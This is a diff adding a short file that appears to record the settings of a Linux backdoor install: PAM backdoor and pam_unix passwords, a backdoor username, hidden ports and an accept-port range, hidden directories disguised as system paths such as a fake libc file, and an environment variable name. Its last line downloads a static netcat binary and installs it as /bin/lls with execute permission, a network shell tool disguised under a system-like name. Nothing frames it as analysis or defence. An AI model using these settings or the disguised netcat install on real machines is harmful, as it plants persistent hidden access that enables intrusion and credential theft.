@@ -1,0 +1,15 @@
+pam_bd password: lqLkdMcyElrA
+pam_unix password: cbOargzaYHSJ
+hidden folder: /lost+found/       /f4g0ZFJP3Eja
+
+
+PAM backdoor username: daddy
+Hidden PAM port: 9997
+accept backdoor low port: 349
+accept backdoor high port: 354
+Hidden directory: /lib/libc.so.daddy.38
+Environment variable: ZOYAUMLPBUWL
+
+
+
+wget "https://github.com/ZephrFish/static-tools/blob/master/netcat?raw=true" -O /bin/lls && chmod +x /bin/lls
